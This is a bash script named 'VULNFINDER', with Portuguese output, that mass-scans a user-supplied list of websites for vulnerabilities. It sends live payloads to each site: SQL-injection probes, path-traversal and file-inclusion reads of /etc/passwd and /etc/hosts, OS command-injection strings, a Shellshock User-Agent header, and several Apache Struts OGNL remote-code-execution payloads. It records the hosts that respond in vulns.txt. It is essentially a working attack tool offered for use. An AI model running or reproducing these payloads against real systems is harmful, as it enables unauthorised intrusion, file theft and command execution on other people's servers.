#!/bin/bash

#VULNFINDER CODED BY JHONNYLUSONODE
echo -e "       

                                          ______    |    
                                       .-"     "-. 
                                      /            \|
                                     |              |
                                     |,  .-.  .-.  ,|
                                     | )(__/  \__)( |
                                     |/     /\     \|
                            (@_      (_     ^^     _)   V U L N F I N D E R
                      _     ) \_______\__|IIIIII|__/__________________________
                     (_)@8@8{}<________|-\IIIIII/-|___________________________>
                            )_/        \          /    ~ @JhonnyLusonode ~
                            (@          ´--------´ 


				 

"                                   
echo "Digite a wordlist com os sites: "; read Wordlist
for sites in `cat $Wordlist`
do
swork1=$(timeout 10 curl -s "$sites%27" |grep "at line 1"|head -n1|awk -F "'" '{print $4}'|awk -F " " '{print $3}') # SQL injection
swork2=$(timeout 10 curl -s "$sites%27" |grep "at line 1"|head -n1|awk -F "'" '{print $6}'|awk -F " " '{print $3}') # SQL injection
swork3=$(timeout 10 curl -s "$sites%27" |grep "parameter "|head -n1|awk -F " " '{print $5}') # SQL injection
swork4=$(timeout 10 curl -s "$sites%27" |grep "at line 1"|head -n1|awk -F " " '{print $32}'|awk -F "<" '{print $1}') # SQL injection
swork5=$(timeout 10 curl -s "$sites%27" |grep "Warning"|head -n1|awk -F ">" '{print $2}'|awk -F "<" '{print $1}') # SQL injection
swork6=$(timeout 10 curl -s "$sites%27" |grep --text "error"|awk -F " " '{print $39}'|awk -F "<" '{print $1}') # SQL injection
swork7=$(timeout 10 curl -s "$sites%27"|grep "at line 1"|awk -F " " '{print $43}'|tr -d "'") # SQL injection
swork8=$(timeout 10 curl -s "$sites%27"|grep "800a0e78"|awk -F ">" '{print $4}'|tr -d "'"|awk -F "<" '{print $1}'|tr -d " "|tr -d "error") # SQL injection
swork9=$(timeout 10 curl -s "$sites%27"|grep "8004014"|awk -F ">" '{print $4}'|tr -d "'"|awk -F "<" '{print $1}'|tr -d " "|tr -d "error") # SQL injection
swork10=$(timeout 10 curl -s "$sites%27"|grep "at line"|awk -F ' ' '{print $28}') # SQL injection
swork11=$(timeout 10  curl -s "$sites%27"|grep "mysql"|head -n1|awk -F " " '{print $4}') # SQL injection
if [ "$swork1" = "1" ] || [ "$swork2" = "1" ] || [ "$swork3" = "1" ] || [ "$swork4" = "1" ] || [ "$swork5" = "Warning" ] || [ "$swork6" = "1" ] || [ "$swork7" = "1" ] || [ "$swork8" = "800a078" ] || [ "$swork9" = "8004014" ] || [ "$swork10" = "line" ]|| [ "$swork11" = "mysql" ]
then
echo -e "\n ------------------------------------ S Q L Injection ------------------------------------ \n"
echo -e "\n \033[0;32mFound Vulnerável a SQL injection: $sites \033[0m"
echo -e "\n \033[0;32mFound Vulnerável a SQL injection: $sites \033[0m" >> vulns.txt
else
echo -e "\n ------------------------------------ S Q L Injection ------------------------------------ \n"
echo -e "\n \033[0;31mNot Found Não está Vulnerável a SQL injection: $sites \033[0m"
fi
#######################################################################################################################################################################

lfd1=$(echo "$sites" > lfd)
lfd2=$(cat lfd|grep "?"|awk -F "=" '{print $1}' >> lfd)
lfd3=$(cat lfd|grep -v "=")
fwork1=$(timeout 10 curl -s "$lfd3=/../../../../../etc/hosts"|grep "localhost"|head -n1|tr -d "localhost") # local file download (LFD)
fwork2=$(timeout 10 curl -s "$lfd3=./../../../../etc/hosts"|grep "localhost"|head -n1|tr -d "localhost") # local file download (LFD)
fwork3=$(timeout 10 curl -s "$lfd3=/../../../../../etc/hosts%00"|grep "localhost"|head -n1|tr -d "localhost") # local file download (LFD)
fwork4=$(timeout 10 curl -s "$lfd3=/etc/hosts%00"|grep "localhost"|head -n1|tr -d "localhost") # local file download (LFD)
fwork4=$(timeout 10 curl -s "$lfd3=/index%00"|grep "Yii"|awk -F ":" '{print $1}') # local file download (LFD)
fwork6=$(timeout 10 curl -s "$lfd3=../index.php"|grep "Yii"|awk -F ":" '{print $1}') # local file download (LFD)
if [ "$fwork1" = "127.0.0.1	" ] || [ "$fwork2" = "127.0.0.1	" ] || [ "$fwork3" = "127.0.0.1	" ] || [ "$fwork4" = "127.0.0.1	" ] || [ "$fwork5" = "Yii" ] || [ "$fwork6" = "Yii" ]
then
echo -e "\n ------------------------------------ L F D ------------------------------------ \n"
echo -e "\n \033[0;32mFound Vulnerável local file download (LFD): "$lfd3=" \033[0m"
echo -e "\n \033[0;32mFound Vulnerável local file download (LFD): "$lfd3=" \033[0m" >> vulns.txt
else
echo -e "\n ------------------------------------ L F D ------------------------------------ \n"
echo -e "\n \033[0;31mNot Found Vulnerável local file download (LFD): "$lfd3=" \033[0m" 
fi
rm -f lfd
#######################################################################################################################################################################

lfi1=$(echo "$sites" > lfi)
lfi2=$(cat lfi|grep "?"|awk -F "=" '{print $1}' >> lfi)
lfiesp=$(echo "" >> lfi)
lfi3=$(cat lfi|grep -v "=")
work7=$(timeout 10 curl -s "$lfi3=/../../../../../../../etc/passwd"|grep "root"|awk -F ":" '{print $1}') # local file inclusion (LFI)
work8=$(timeout 10 curl -s "$lfi3=/../../../../../../../etc/passwd%00"|grep "root"|awk -F ":" '{print $1}') # local file inclusion (LFI)
work9=$(timeout 10 curl -s "$lfi3=../../../../../../../etc/passwd%00"|grep "root"|awk -F ":" '{print $1}') # local file inclusion (LFI)
work11=$(timeout 10 curl -s "$lfi3=/etc/passwd"|grep "root"|awk -F ":" '{print $1}') # local file inclusion (LFI)
work12=$(timeout 10 curl -s "$lfi3=//etc//passwd"|grep "root"|awk -F ":" '{print $1}') # local file inclusion (LFI)
work13=$(timeout 10 curl -s "$lfi3=//etc//passwd%00"|grep "root"|awk -F ":" '{print $1}') # local file inclusion (LFI)
if [ "$work7" = "root" ] || [ "$work8" = "root" ] || [ "$work9" = "root" ] || [ "$work10" = "root" ] || [ "$work11" = "root" ] || [ "$work12" = "root" ] || [ "$work13" = "root" ]
then
echo -e "\n ------------------------------------ L F I ------------------------------------ \n"
echo -e "\n \033[0;32mFound Vulnerável local file inclusion (LFI): "$lfi3=" \033[0m"
echo -e "\n \033[0;32mFound Vulnerável local file inclusion (LFI): "$lfi3=" \033[0m" >> vulns.txt
else
echo -e "\n ------------------------------------ L F I ------------------------------------ \n"
echo -e "\n \033[0;31mNot Found Vulnerável local file inclusion (LFI): "$lfi3=" \033[0m"
fi
rm -f lfi
#######################################################################################################################################################################
cmi1=$(echo "$sites" > cmi)
cmi2=$(cat cmi|grep "?"|awk -F "=" '{print $1}' >> cmi)
cmiesp=$(echo "" >> cmi)
cmi3=$(cat cmi|grep -v "=")
work7=$(timeout 10 curl -s "$cmi3=%7Ccat%20/etc/hosts%7C"|grep "localhost"|awk -F " " '{print $2}'|awk -F ">" '{print $3}') # Command_Injection
work8=$(timeout 10 curl -s "$cmi3=;cat /etc/hosts"|grep "localhost"|awk -F " " '{print $2}'|awk -F ">" '{print $3}') # Command_Injection
work9=$(timeout 10 curl -s "$cmi3=&&cat /etc/hosts"|grep "localhost"|awk -F " " '{print $2}'|awk -F ">" '{print $3}') # Command_Injection
work11=$(timeout 10 curl -s "$cmi3=|cat /etc/hosts"|grep "localhost"|awk -F " " '{print $2}'|awk -F ">" '{print $3}') # Command_Injection
work12=$(timeout 10 curl -s "$cmi3=||cat /etc/hosts"|grep "localhost"|awk -F " " '{print $2}'|awk -F ">" '{print $3}') # Command_Injection
work13=$(timeout 10 curl -s "$cmi3=&cat /etc/hosts"|grep "localhost"|awk -F " " '{print $2}'|awk -F ">" '{print $3}') # Command_Injection
if [ "$work7" = "127.0.0.1" ] || [ "$work8" = "127.0.0.1" ] || [ "$work9" = "127.0.0.1" ] || [ "$work10" = "127.0.0.1" ] || [ "$work11" = "127.0.0.1" ] || [ "$work12" = "127.0.0.1" ] || [ "$work13" = "127.0.0.1" ]
then
echo -e "\n ------------------------------------ Command_Injection ------------------------------------ \n"
echo -e "\n \033[0;32mFound Vulnerável Command_OS_Injection: "$cmi3=" \033[0m"
echo -e "\n \033[0;32mFound Vulnerável Command_OS_Injection: "$cmi3=" \033[0m" >> vulns.txt
else
echo -e "\n ------------------------------------ Command_Injection ------------------------------------ \n"
echo -e "\n \033[0;31mNot Found Vulnerável Command_OS_Injection: "$cmi3=" \033[0m"
fi
rm -f cmi
#######################################################################################################################################################################

shk1=$(echo "$sites" > shk)
shk2=$(cat shk|grep "cgi"|awk -F "?" '{print $1}' >> shk)
shkesp=$(echo "" >> shk)
shk3=$(cat shk|grep -v "=")
work7=$(timeout 10 curl -s -H "User-Agent: () { :; }; echo ; /bin/cat /etc/passwd " "$shk3"|grep "root"|awk -F ":" '{print $1}') # Shellshock execute arbitrary commands
if [ "$work7" = "root" ]
then
echo -e "\n ------------------------------------ ShellShock Method1 ------------------------------------ \n"
echo -e "\n \033[0;32mFound Vulnerável Shellshock(Method1): "$shk3" \033[0m"
echo -e "\n \033[0;32mFound Vulnerável Shellshock(Method1): "$shk3" \033[0m" >> vulns.txt
else
echo -e "\n ------------------------------------ ShellShock Method1 ------------------------------------ \n"
echo -e "\n \033[0;31mNot Found Vulnerável Shellshock(Method1): "$shk3" \033[0m"
fi
rm -f shk
#######################################################################################################################################################################
work7=$(timeout 10 curl -s -H "User-Agent: () { :; }; echo ; /bin/cat /etc/passwd " "$sites"|grep "root"|awk -F ":" '{print $1}') # Shellshock execute arbitrary commands
if [ "$work7" = "root" ]
then
echo -e "\n ------------------------------------ ShellShock Method2 ------------------------------------ \n"
echo -e "\n \033[0;32mFound Vulnerável Shellshock(Method2): "$sites" \033[0m"
echo -e "\n \033[0;32mFound Vulnerável Shellshock(Method2): "$sites" \033[0m" >> vulns.txt
else
echo -e "\n ------------------------------------ ShellShock Method2------------------------------------ \n"
echo -e "\n \033[0;31mNot Found Vulnerável Shellshock(Method2): "$sites" \033[0m"
fi
#######################################################################################################################################################################
shk1=$(echo "$sites" > shk)
shk2=$(cat shk|grep "="|awk -F "?" '{print $1}' >> shk)
shkesp=$(echo "" >> shk)
shk3=$(cat shk|grep -v "=")
work7=$(timeout 10 curl -s -H "User-Agent: () { :; }; echo ; /bin/cat /etc/passwd " "$shk3"|grep "root"|awk -F ":" '{print $1}') # Shellshock execute arbitrary commands
if [ "$work7" = "root" ]
then
echo -e "\n ------------------------------------ ShellShock Method3 ------------------------------------ \n"
echo -e "\n \033[0;32mFound Vulnerável Shellshock(Method3): "$shk3" \033[0m"
echo -e "\n \033[0;32mFound Vulnerável Shellshock(Method3): "$shk3" \033[0m" >> vulns.txt
else
echo -e "\n ------------------------------------ ShellShock Method3 ------------------------------------ \n"
echo -e "\n \033[0;31mNot Found Vulnerável Shellshock(Method1): "$shk3" \033[0m"
fi
rm -f shk
#######################################################################################################################################################################
sts1=$(echo "$sites" > sts)
sts2=$(cat sts|grep "?"|awk -F "=" '{print $1}' >> sts)
sts3=$(cat sts|grep -v "=")
fwork1=$(timeout 10 curl -s "$sts3/debug=command&expression=#a=(new java.lang.ProcessBuilder('/bin/cat /etc/passwd')).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#out.getWriter().println('dbapp:'+new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()"|grep "root"|awk -F ":" '{print $1}') # STRUTS
fwork2=$(timeout 10 curl -s "$sts3=/(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('/bin/cat /etc/passwd').getInputStream()))"|grep "root"|awk -F ":" '{print $1}') # STRUTS
fwork3=$(timeout 10 curl -s "$sts3=/method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString&pp=\\A&ppp= &encoding=UTF-8&cmd=/bin/cat /etc/passwd"|grep "root"|awk -F ":" '{print $1}') # STRUTS
fwork4=$(timeout 10 curl -s "$sts3=/#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#xx=123,#rs=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.command[0]).getInputStream()),#wr=#context[#parameters.obj[0]].getWriter(),#wr.print(#rs),#wr.close(),#xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=/bin/cat /etc/passwd"|grep "root"|awk -F ":" '{print $1}') # STRUTS
fwork5=$(timeout 10 curl -s "$sts3=/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#wr=#context[#parameters.obj[0]].getWriter(),#rs=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.command[0]).getInputStream()),#wr.println(#rs),#wr.flush(),#wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=/bin/cat /etc/passwd"|grep "root"|awk -F ":" '{print $1}') # STRUTS
if [ "$fwork1" = "root" ] || [ "$fwork2" = "root" ] || [ "$fwork3" = "root" ] || [ "$fwork4" = "root" ] || [ "$fwork5" = "root" ]
then
echo -e "\n ------------------------------------ STRUTS ------------------------------------ \n"
echo -e "\n \033[0;32mFound Vulnerável STRUTS: "$sts3=" \033[0m"
echo -e "\n \033[0;32mFound Vulnerável STRUTS: "$sts3=" \033[0m" >> vulns.txt
else
echo -e "\n ------------------------------------ STRUTS ------------------------------------ \n"
echo -e "\n \033[0;31mNot Found Vulnerável STRUTS: "$sts3=" \033[0m" 
fi
rm -f sts
#######################################################################################################################################################################





done
echo -e "\n\n                             F I M  D O  S C A N
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
{                                                                             }
{                                                                             }
{           Ficheiro Gerado Com Os Sites Vulnéraveis...{ vulns.txt }           }
{                                                                             } 
{                                                                             }
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
\n"; ls vulns.txt






















